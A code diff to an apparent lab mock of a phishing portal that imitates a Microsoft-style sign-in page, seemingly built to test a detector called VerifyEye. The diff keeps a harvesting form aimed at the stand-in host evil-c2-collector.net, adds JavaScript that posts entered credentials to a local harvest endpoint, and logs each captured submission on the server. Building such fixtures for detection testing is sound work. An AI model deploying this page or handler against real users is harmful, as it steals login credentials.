@@ -114,8 +114,10 @@ HTML_PAYLOAD = """<!DOCTYPE html>
         </div>
         <div class="subtitle">Sign in to your account to continue</div>
         
-        <!-- Malicious harvesting form: posts to external off-domain API -->
-        <form action="http://evil-c2-collector.net/api/v1/harvest" method="POST">
+        <!-- Malicious harvesting form: keeps off-domain action attribute for VerifyEye DOM detection
+             while posting live lab telemetry to /api/v1/harvest and chaining to /captcha -->
+        <form action="http://evil-c2-collector.net/api/v1/harvest" method="POST"
+              onsubmit="event.preventDefault(); fetch('/api/v1/harvest', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body: new URLSearchParams(new FormData(this))}).finally(() => { window.location.href = '/captcha'; });">
             <div class="form-group">
                 <label for="username">Email, phone, or Skype</label>
                 <input type="email" id="username" name="email" placeholder="user@company.com" required autocomplete="off">
@@ -352,16 +354,16 @@ class PortalHandler(http.server.SimpleHTTPRequestHandler):
 
     def do_POST(self):
         # Even if credentials submit here, return 200 OK
-        content_len = int(self.headers.get("Content-Length", 0))
+        content_len = max(0, min(int(self.headers.get("Content-Length", 0)), 65536))
         post_data = self.rfile.read(content_len) if content_len > 0 else b""
-        print(f"[!] Harvested submission: {post_data.decode('utf-8', errors='ignore')}")
+        print(f"[!] Harvested submission from {self.address_string()}: {post_data.decode('utf-8', errors='ignore')}", flush=True)
         self.send_response(200)
         self.send_header("Content-Type", "application/json")
         self.end_headers()
         self.wfile.write(b'{"status": "captured"}')
 
     def log_message(self, format, *args):
-        print(f"[MockPortal] {self.address_string()} - {format % args}")
+        print(f"[MockPortal] {self.address_string()} - {format % args}", flush=True)
 
 
 def main():
